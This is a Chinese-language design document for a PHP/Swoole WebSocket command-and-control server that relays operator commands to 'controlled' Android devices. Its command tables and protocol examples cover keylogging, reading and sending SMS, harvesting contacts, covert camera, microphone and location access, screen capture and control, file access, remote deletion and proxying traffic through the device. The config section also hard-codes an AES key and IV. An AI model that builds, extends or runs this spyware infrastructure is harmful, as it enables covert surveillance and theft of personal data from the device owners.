# PHP WebSocket 服务器实现文档

> 本文档描述从 Node.js 迁移到 PHP + Swoole 的 WebSocket 服务器实现。

## 概述

基于 **Swoole** 扩展实现的高性能 WebSocket 服务器，完全兼容原 Node.js 协议，用于管理面板与 Android 设备之间的实时双向通信。

### 技术栈

| 组件 | 技术 | 说明 |
|------|------|------|
| 运行时 | PHP 8.5 + Swoole | 高性能异步框架 |
| 框架 | Laravel 12 | 配置、日志、数据库集成 |
| 连接存储 | Swoole\Table | 跨 Worker 共享内存 |
| 状态缓存 | Redis | 设备状态持久化 |
| 加密 | OpenSSL | AES-256-CBC |

### 端口配置

| 服务 | 端口 | 说明 |
|------|------|------|
| WebSocket Server | 8081 | 主服务端口 (避免与旧 Node.js 8080 冲突) |

---

## 系统架构

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   管理面板       │◄───────►│  WebSocket Server │◄───────►│   Android 设备   │
│   (Web 前端)     │         │    (PHP/Swoole)   │         │   (被控端)       │
│   itype=slr_panel│         │    Port: 8081     │         │ itype=Slr_client │
└─────────────────┘         └──────────────────┘         └─────────────────┘
```

### 模块架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           Server.php (主入口)                            │
│  - Swoole WebSocket Server 初始化                                        │
│  - 事件处理器注册 (onOpen, onMessage, onClose)                            │
│  - 心跳定时器启动                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                        MessageRouter.php (消息路由)                       │
│  - JSON 解析                                                             │
│  - 根据 itype 分发到对应 Handler                                          │
│  - checkphone 特殊处理                                                    │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
            ┌───────────────────────┼───────────────────────┐
            ▼                       ▼                       ▼
┌───────────────────┐   ┌───────────────────┐   ┌───────────────────┐
│  DeviceHandler    │   │   PanelHandler    │   │ PanelSendHandler  │
│  (Slr_client)     │   │   (slr_panel)     │   │ (slr_panelsend)   │
│  - 设备注册        │   │  - join/out/ping  │   │  - 数据操作命令    │
│  - ping 处理       │   │  - 屏幕控制       │   │  - 文件/应用管理   │
│  - 数据转发到面板  │   │  - 浏览器/代理    │   │  - 摄像头/麦克风   │
└───────────────────┘   └───────────────────┘   └───────────────────┘
            │                       │                       │
            └───────────────────────┼───────────────────────┘
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                     ConnectionManager.php (连接管理)                      │
│  - Swoole\Table 存储连接映射                                              │
│  - 设备/面板注册与断开                                                    │
│  - 消息发送 (sendToDevice, sendToPanels)                                 │
│  - Redis 状态同步                                                        │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 文件结构

```
app/
├── config/
│   └── websocket.php                    # WebSocket 配置
├── app/
│   ├── Console/Commands/
│   │   └── WebSocketServe.php           # Artisan 启动命令
│   └── WebSocket/
│       ├── Server.php                   # Swoole 服务器主类
│       ├── ConnectionManager.php        # 连接管理器
│       ├── MessageRouter.php            # 消息路由分发
│       ├── Handlers/
│       │   ├── DeviceHandler.php        # 设备消息处理
│       │   ├── PanelHandler.php         # 面板控制命令
│       │   ├── PanelSendHandler.php     # 面板数据操作
│       │   └── CheckPhoneHandler.php    # 设备列表查询
│       └── Services/
│           ├── DeviceStatusService.php  # 设备状态管理
│           ├── HeartbeatService.php     # 心跳检测
│           └── EncryptionService.php    # AES 加密服务
```

---

## 配置说明

### config/websocket.php

```php
return [
    // 服务器绑定
    'host' => env('WEBSOCKET_HOST', '0.0.0.0'),
    'port' => (int) env('WEBSOCKET_PORT', 8081),

    // Swoole 设置
    // ⚠️ 重要：worker_num 必须为 1，否则跨 Worker 通信会失败
    // 详见下方 "Swoole 多 Worker 限制" 章节
    'settings' => [
        'worker_num' => 1,                    // Worker 进程数 (必须为 1)
        'max_connection' => 10000,            // 最大连接数
        'heartbeat_check_interval' => 25,     // 心跳检查间隔 (秒)
        'heartbeat_idle_time' => 75,          // 空闲超时 (秒)
        'package_max_length' => 10 * 1024 * 1024,  // 10MB 最大消息
    ],

    // 心跳配置
    'heartbeat' => [
        'timeout' => 75,           // 超时时间 (秒)
        'check_interval' => 25,    // 检查间隔 (秒)
    ],

    // 加密配置 (必须与旧系统一致)
    'encryption' => [
        'key' => '@zxfNM=q>Drm`6VP)!:u-A~;92E<.?wR',
        'iv' => 'G8v!h3*Y.P+pFm/;',
        'method' => 'AES-256-CBC',
    ],

    // 客户端类型标识 (协议兼容)
    'client_types' => [
        'device' => 'Slr_client',
        'panel' => 'slr_panel',
        'panel_send' => 'slr_panelsend',
    ],

    // Redis 配置
    'redis' => [
        'prefix' => 'ws:',
        'device_status_ttl' => 86400,  // 24 小时
    ],
];
```

### 环境变量

```bash
# .env
WEBSOCKET_HOST=0.0.0.0
WEBSOCKET_PORT=8081
WEBSOCKET_WORKERS=1  # 必须为 1，详见下方说明
WEBSOCKET_LOG_MESSAGES=false
```

---

## Swoole 多 Worker 限制

> ⚠️ **重要**: 当前实现要求 `worker_num = 1`，否则设备在线状态判断和跨进程消息发送会失败。

### 问题描述

在 Swoole 多 Worker 模式下（worker_num > 1），会遇到以下问题：

1. **`isEstablished($fd)` 跨 Worker 失效**: 只能检查当前 Worker 管理的连接，其他 Worker 的连接会返回 `false`
2. **`$server->push($fd)` 跨 Worker 失败**: 尝试向其他 Worker 管理的连接发送消息会报错 `session#X does not exist`

### 问题现象

```
// 设备连接到 Worker 0，管理端连接到 Worker 1
// Worker 1 查询设备状态时：
$deviceFd = $this->connectionManager->getDeviceFd($phoneId);  // 返回正确的 fd
$server->isEstablished($deviceFd);  // 返回 false (跨 Worker)
$server->push($deviceFd, $data);    // 报错: session#X does not exist
```

### 解决方案对比

| 方案 | 复杂度 | 适用场景 | 当前状态 |
|------|--------|----------|----------|
| **单 Worker 模式** | 低 | 中小规模 (<1000 连接) | ✅ 已实现 |
| Redis Pub/Sub | 中 | 大规模、多节点 | ⏳ 待实现 |
| Swoole Task Worker | 中 | 大规模、单节点 | ⏳ 待实现 |
| Swoole sendMessage | 中 | 大规模、单节点 | ⏳ 待实现 |

### 当前实现：单 Worker 模式

```php
// config/websocket.php
'settings' => [
    'worker_num' => 1,  // 所有连接在同一个 Worker 中处理
],
```

**优点**:
- 实现简单，无需额外的 IPC 机制
- `isEstablished()` 和 `push()` 正常工作
- Swoole Table 共享内存正常工作

**缺点**:
- 单进程处理所有请求，CPU 利用率受限
- 适合中小规模部署（几百个并发连接）

### 未来优化：Redis Pub/Sub 方案

如果需要支持大规模连接或多节点部署，可以实现 Redis Pub/Sub：

```php
// 发送消息时发布到 Redis
public function sendToDevice(string $phoneId, array $data): bool
{
    $channel = "ws:device:{$phoneId}";
    Redis::publish($channel, json_encode($data));
    return true;
}

// 每个 Worker 订阅 Redis 并处理
public function onWorkerStart(SwooleServer $server, int $workerId): void
{
    go(function () use ($server) {
        $redis = new \Redis();
        $redis->psubscribe(['ws:device:*'], function ($redis, $pattern, $channel, $message) use ($server) {
            $phoneId = str_replace('ws:device:', '', $channel);
            $fd = $this->connectionManager->getDeviceFd($phoneId);
            if ($fd !== null && $server->isEstablished($fd)) {
                $server->push($fd, $message);
            }
        });
    });
}
```

### 关键代码修改点

**1. Server.php - 共享表初始化**

Swoole Table 必须在 `$server->start()` **之前** 创建，才能在所有 Worker 间共享：

```php
public function __construct()
{
    $this->server = new SwooleServer($host, $port);
    
    // 关键：在 server->start() 之前创建共享表
    $this->initializeSharedTables();
    
    $this->connectionManager = new ConnectionManager($this->server, [
        'fdToPhoneId' => $this->fdToPhoneId,
        'phoneIdToFd' => $this->phoneIdToFd,
        // ...
    ]);
}
```

**2. PanelHandler.php - 在线状态判断**

使用共享表判断设备是否在线，而不是 `isEstablished()`：

```php
private function handlePing(int $fd, string $phoneId): void
{
    // ❌ 错误：跨 Worker 会返回 false
    // $serverToPhone = $server->isEstablished($deviceFd) ? 'OPEN' : 'CLOSED';
    
    // ✅ 正确：使用共享表判断
    $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
    $serverToPhone = $isOnline ? 'OPEN' : 'CLOSED';
}
```

---

## 核心类说明

### Server.php

Swoole WebSocket 服务器主类，负责：
- 初始化 Swoole\WebSocket\Server
- 注册事件处理器 (onStart, onWorkerStart, onOpen, onMessage, onClose)
- 启动心跳检测定时器

```php
// 启动服务器
$server = new \App\WebSocket\Server();
$server->start();
```

### ConnectionManager.php

连接管理器，使用 Swoole\Table 实现跨 Worker 共享：

| Table | 键 | 值 | 用途 |
|-------|-----|-----|------|
| fdToPhoneId | fd (string) | phone_id, client_type | fd → 设备ID 映射 |
| phoneIdToFd | phone_id | fd (int) | 设备ID → fd 映射 |
| panelSubscriptions | fd (string) | phone_id | 面板订阅关系 (单设备控制) |
| panelUserSubscriptions | fd (string) | email_encrypted, is_admin | Panel 用户订阅 (推送模式) |

**主要方法：**

```php
// 注册设备连接
$connectionManager->registerDevice($fd, $phoneId);

// 注册面板订阅 (单设备控制)
$connectionManager->registerPanel($fd, $phoneId);

// 注册 Panel 用户订阅 (推送模式)
$connectionManager->registerPanelUser($fd, $emailEncrypted, $isAdmin);

// 发送消息到设备
$connectionManager->sendToDevice($phoneId, ['type' => 'xxx', ...]);

// 发送消息到所有订阅面板 (单设备)
$connectionManager->sendToPanels($phoneId, ['type' => 'xxx', ...]);

// 推送设备上线通知给相关 Panel 用户
$connectionManager->notifyPanelUsersDeviceOnline($phoneId, $userId, $deviceInfo);

// 推送设备离线通知给相关 Panel 用户
$connectionManager->notifyPanelUsersDeviceOffline($phoneId, $userId);

// 获取设备客户端 IP
$connectionManager->getClientIp($phoneId);  // 支持 IPv6-mapped IPv4 转换
```

### MessageRouter.php

消息路由分发器：

```php
public function route(int $fd, string $rawData): void
{
    $data = json_decode($rawData, true);
    $itype = $data['itype'] ?? null;

    // checkphone 特殊处理
    if ($data['subc'] === 'checkphone') {
        $this->checkPhoneHandler->handle($fd, $data);
        return;
    }

    // 根据 itype 分发
    match ($itype) {
        'Slr_client' => $this->deviceHandler->handle($fd, $data),
        'slr_panel' => $this->panelHandler->handle($fd, $data),
        'slr_panelsend' => $this->panelSendHandler->handle($fd, $data),
        default => $this->handleUnknownType($fd, $itype),
    };
}
```

### HeartbeatService.php

简化版心跳检测服务：

```php
// 记录设备 ping
$heartbeatService->recordPing($phoneId);

// 检查所有设备 (由定时器调用)
$heartbeatService->checkAll();
// - 超过 75 秒无心跳 → 直接断开连接
// - 与 Node.js 行为一致，无 probe 机制
```

---

## Handler 详解

### DeviceHandler (Slr_client)

处理设备端消息：

| subc | 处理逻辑 |
|------|----------|
| `ping` | 更新心跳时间，解析设备状态，推送给订阅面板 |
| 其他 | 转发到订阅的管理面板 |

**Device → Panel 字段映射：**

```php
// 消息类型映射
'klogs' → type: 'klog', data: msg
'mic' → type: 'mic', data: voip (不是 msg)
'screen'/'screenshot' → type: subc, data: img, wmob, hmob
'cam' → type: 'cam', data: img
'thumb' → type: 'thumb', data: msg, path: pth
'srch' → type: 'srch', data: pths, sfor: stype
'down' → 文件下载分片字段
'proxy' → 根据 ctype (first/state/dataup) 返回不同结构
```

### PanelHandler (slr_panel)

处理面板控制命令：

| subc | 功能 | 转发格式 |
|------|------|----------|
| `join` | 订阅设备 | 返回 joinResponse |
| `out` | 退出控制 | type: screencomd, subc: out |
| `ping` | 状态查询 | 返回 statusBatch |
| `disag` | 断开设备 | 关闭设备连接 |
| `screen` | 屏幕控制 | type: screen, subc: xxx |
| `brows` | 浏览器控制 | type: brows, subc: h/n |
| `proxy` | 代理控制 | type: proxy, subc: 1/0 |
| `bc` | 广播通知 | type: bc, subc: A/N |

**statusBatch 返回格式：**

```php
[
    'type' => 'statusBatch',
    'pid' => $phoneId,
    'serverToPhone' => 'OPEN' | 'CLOSED' | 'UNKNOWN',
    'lastPing' => 'Y-m-d H:i:s',
    'phoneInfo' => [...],
]
```

### PanelSendHandler (slr_panelsend)

处理面板数据操作命令：

| subc | 功能 | 特殊处理 |
|------|------|----------|
| `screen` | 屏幕共享 | screentype 参数 |
| `cam`/`camoff` | 摄像头 | SelectedCam 参数 |
| `mic`/`micoff` | 麦克风 | - |
| `loc`/`locoff` | 定位 | - |
| `SMS` | 获取短信 | - |
| `SMSSEND` | 发送短信 | smsnumber, message |
| `Contacts` | 获取联系人 | - |
| `files` | 文件列表 | filepath |
| `changefiles` | 文件操作 | 上传分片 (256KB/chunk) |
| `Keylog` | 键盘监听控制 | keylogtype: '1'=开启, '0'=关闭 |
| `Logdate` | 按日期查询键盘记录 | keylogdate: 'YYYY-MM-DD' |
| `LOADAPPS` | 应用列表 | - |
| `OPENAPP` | 打开应用 | packageName |
| `activz`/`notifys`/`vapps`/`vlinks` | 活动记录 | 映射到 Activitys 类型 |
| `Permissions` | 权限管理 | subc=R 时发送 |
| `delete` | 远程删除 | type: Delete, subc: [reme] |
| `Notify` | 通知控制 | type: Notifi |

#### 键盘监听详解

键盘记录数据**存储在设备端**，服务器仅做转发，不存储任何键盘数据。

**开启/关闭监听：**
```php
// Panel → Server → Device
{
    "itype": "slr_panelsend",
    "subc": "Keylog",
    "pid": "device-uuid",
    "keylogtype": "1"  // '1'=开启, '0'=关闭
}

// Server 转发到设备
{
    "type": "screencomd",
    "subc": "Keylog",
    "keylogtype": "1"
}
```

**按日期查询：**
```php
// Panel → Server → Device
{
    "itype": "slr_panelsend",
    "subc": "Logdate",
    "pid": "device-uuid",
    "keylogdate": "2026-02-01"
}

// Server 转发到设备
{
    "type": "screencomd",
    "subc": "Logdate",
    "keylogtype": "0",
    "keylogdate": "2026-02-01"
}
```

**设备返回数据：**
```php
// Device → Server (subc: klogs)
{
    "itype": "Slr_client",
    "subc": "klogs",
    "pid": "device-uuid",
    "msg": "[{\"time\":\"...\",\"app\":\"...\",\"action\":\"...\",\"status\":\"...\"}]"
}

// Server → Panel (type: klog)
{
    "type": "klog",
    "data": "[{\"time\":\"...\",\"app\":\"...\",\"action\":\"...\",\"status\":\"...\"}]",
    "pid": "device-uuid"
}
```

### CheckPhoneHandler

设备列表查询，支持分页、过滤和推送模式注册：

```php
// 请求
{
    "subc": "checkphone",
    "email": "加密的邮箱",
    "page": 1,
    "pageSize": 10,
    "filters": {
        "user_email": "",
        "phone_name": "",
        "country": "",
        "model": "",
        "accessibility": "",
        "install_date": ""
    }
}

// 响应
{
    "type": "checkphone",
    "list": [...],
    "total": 100,
    "pageCount": 10,
    "page": 1,
    "pageSize": 10,
    "fileLastModified": "2026-01-31 08:00:00"
}
```

**推送模式注册：** `checkphone` 请求会自动注册 Panel 用户订阅，后续设备状态变化会主动推送。

### DeviceStatusService

设备状态管理服务，负责：
- 解析设备 ping 消息中的状态信息
- 同步状态到 Redis 缓存
- **自动创建新设备记录** (首次上线时)
- **触发设备上线/离线推送**

```php
// 设备上线时自动创建数据库记录
$deviceStatusService->updateFromPing($phoneId, $encodedData);
// - 解析设备状态
// - 首次上线时创建 Device 记录
// - 通过 user_email 关联用户
// - 触发 notifyPanelUsersDeviceOnline()

// 标记设备离线
$deviceStatusService->markOffline($phoneId);
```

---

## 启动与运行

### 启动命令

```bash
# 使用 Sail
./vendor/bin/sail artisan websocket:serve

# 指定端口
./vendor/bin/sail artisan websocket:serve --port=8082

# 直接运行 (需要 Swoole 扩展)
php artisan websocket:serve
```

### 验证 Swoole 安装

```bash
./vendor/bin/sail php -m | grep swoole
./vendor/bin/sail php --ri swoole
```

### 日志查看

```bash
# WebSocket 日志
tail -f storage/logs/websocket.log

# Laravel 日志
tail -f storage/logs/laravel.log
```

### 进程管理

```bash
# 查看 PID
cat storage/app/websocket.pid

# 停止服务器
kill $(cat storage/app/websocket.pid)
```

---

## 与 Node.js 实现对比

### 相同点

| 特性 | Node.js | PHP/Swoole |
|------|---------|------------|
| 消息协议 | JSON | JSON (100% 兼容) |
| 客户端类型 | Slr_client/slr_panel/slr_panelsend | 相同 |
| 心跳超时 | 75 秒 | 75 秒 |
| 检查间隔 | 25 秒 | 25 秒 |
| 加密算法 | AES-256-CBC | AES-256-CBC |
| 加密密钥 | 相同 | 相同 |

### 不同点

| 特性 | Node.js | PHP/Swoole |
|------|---------|------------|
| 端口 | 8080 | 8081 |
| 连接存储 | Map (单进程) | Swoole\Table (多进程共享) |
| 状态持久化 | 内存 | Redis |
| 心跳探测 | 有 probe 机制 | 无 (直接断开) |
| 数据库访问 | 无 | Eloquent ORM |

### 迁移注意事项

1. **端口变更**: 前端需要更新 WebSocket URL 从 `ws://host:8080` 到 `ws://host:8081`
2. **协议兼容**: 消息格式完全兼容，前端和 Android 客户端无需修改
3. **并行运行**: 可以同时运行 Node.js (8080) 和 PHP (8081) 进行对比测试

---

## 数据流示例

### 推送模式架构 (新)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           推送模式完整流程                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. Panel 首次连接                                                          │
│     ┌─────────┐   checkphone    ┌─────────────┐                            │
│     │ Panel A │ ───────────────► │   Swoole    │                            │
│     └─────────┘                  │   Server    │                            │
│          │                       └─────────────┘                            │
│          │                             │                                    │
│          │    registerPanelUser(fd, emailA, isAdmin=false)                  │
│          │                             │                                    │
│          ◄─────────────────────────────┤                                    │
│     checkphone response (设备列表)      │                                    │
│                                        │                                    │
│  2. 新设备上线                          │                                    │
│     ┌─────────┐      ping             │                                    │
│     │ Device  │ ─────────────────────►│                                    │
│     └─────────┘                       │                                    │
│                                        │                                    │
│          • 创建数据库记录 (首次)         │                                    │
│          • 关联用户 (通过 user_email)   │                                    │
│          • notifyPanelUsersDeviceOnline()                                   │
│                                        │                                    │
│          ┌─────────────────────────────┘                                    │
│          │                                                                  │
│          ▼  遍历 panelUserSubscriptions                                     │
│     ┌─────────────────────────────────────────────┐                        │
│     │ if (isAdmin || email === deviceOwnerEmail)  │                        │
│     │     send(fd, { type: 'deviceOnline', ... }) │                        │
│     └─────────────────────────────────────────────┘                        │
│          │                                                                  │
│          ▼                                                                  │
│     ┌─────────┐                                                            │
│     │ Panel A │ ◄── deviceOnline { pid, deviceInfo }                       │
│     └─────────┘                                                            │
│                                                                             │
│  3. 设备离线                                                                │
│     ┌─────────┐   disconnect                                               │
│     │ Device  │ ─────────────────────► handleDisconnect()                  │
│     └─────────┘                              │                              │
│                                              │                              │
│          • 更新数据库 is_online = false       │                              │
│          • notifyPanelUsersDeviceOffline()   │                              │
│                                              │                              │
│     ┌─────────┐                              │                              │
│     │ Panel A │ ◄── deviceOffline { pid }  ──┘                              │
│     └─────────┘                                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 推送消息格式

**设备上线 (deviceOnline)**:
```json
{
  "type": "deviceOnline",
  "pid": "device-123",
  "deviceInfo": {
    "phone_id": "device-123",
    "phone_name": "Test Device",
    "model": "Pixel 8",
    "battery_charge": "85",
    "is_online": true
  }
}
```

**设备离线 (deviceOffline)**:
```json
{
  "type": "deviceOffline",
  "pid": "device-123",
  "deviceInfo": null
}
```

### 用户隔离机制

| 用户类型 | 收到的推送 |
|---------|-----------|
| 普通用户 | 仅自己的设备 (通过 email_encrypted 匹配) |
| 管理员 | 所有设备 (is_admin = true) |

### 设备连接流程 (旧)

```
1. Device → Server: {"itype":"Slr_client","pid":"xxx","subc":"ping","msg":"..."}
2. Server: 注册设备到 ConnectionManager
3. Server: 解析 msg 中的设备状态
4. Server: 更新 Redis 缓存
5. Server → Panels: {"type":"deviceUpdate","pid":"xxx","phoneInfo":{...}}
```

### 面板控制流程

```
1. Panel → Server: {"itype":"slr_panel","pid":"xxx","subc":"join","usercheck":"..."}
2. Server: 注册面板订阅
3. Server → Panel: {"type":"joinResponse","pid":"xxx","is_online":true,"phoneInfo":{...}}
4. Panel → Server: {"itype":"slr_panel","pid":"xxx","subc":"screen","comand":"snap"}
5. Server → Device: {"type":"screen","subc":"snap","snaptype":"1"}
6. Device → Server: {"itype":"Slr_client","pid":"xxx","subc":"screenshot","img":"..."}
7. Server → Panel: {"type":"screenshot","data":"...","pid":"xxx","wmob":"...","hmob":"..."}
```

---

## 故障排查

### 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 无法启动 | Swoole 未安装 | 重建 Docker 镜像 |
| 连接被拒绝 | 端口未开放 | 检查 docker-compose.yml 端口映射 |
| 设备无法连接 | 协议不匹配 | 检查 itype 值是否正确 |
| 面板收不到数据 | 未订阅设备 | 确保先发送 join 消息 |
| 心跳超时 | 网络不稳定 | 检查设备网络连接 |
| **设备在线但显示离线** | worker_num > 1 | 确保 `worker_num = 1` |
| **session#X does not exist** | 跨 Worker 发送失败 | 确保 `worker_num = 1` |
| **PHP 代码修改后不生效** | Swoole 是常驻内存服务 | 必须重启 WebSocket 服务 |

### 调试模式

```bash
# 启用详细日志
WEBSOCKET_LOG_MESSAGES=true php artisan websocket:serve
```

### 连接状态检查

```php
// 获取连接统计
$connectionManager->getConnectionCount();  // 总连接数
$connectionManager->getDeviceCount();      // 设备数
$connectionManager->getPanelCount();       // 面板数
```

---

## 后续优化计划

- [x] 推送模式 (设备上线/离线实时推送)
- [x] 设备自动注册 (首次上线自动创建数据库记录)
- [x] 用户隔离 (普通用户只收到自己设备的推送)
- [x] 修复多 Worker 跨进程通信问题 (改为单 Worker 模式)
- [ ] SSL/TLS 支持 (wss://)
- [ ] 连接认证中间件
- [ ] Prometheus 监控指标
- [ ] 多 Worker 支持 (Redis Pub/Sub 或 Swoole Task Worker)
- [ ] 集群部署支持 (多节点 + Redis)

---

## 相关文档

- [WEBSOCKET_SERVER.md](../WEBSOCKET_SERVER.md) - Node.js 原始实现分析
- [WEBSOCKET_CLIENT.md](./WEBSOCKET_CLIENT.md) - 前端客户端实现
- [DEVELOPMENT.md](./DEVELOPMENT.md) - 开发环境配置
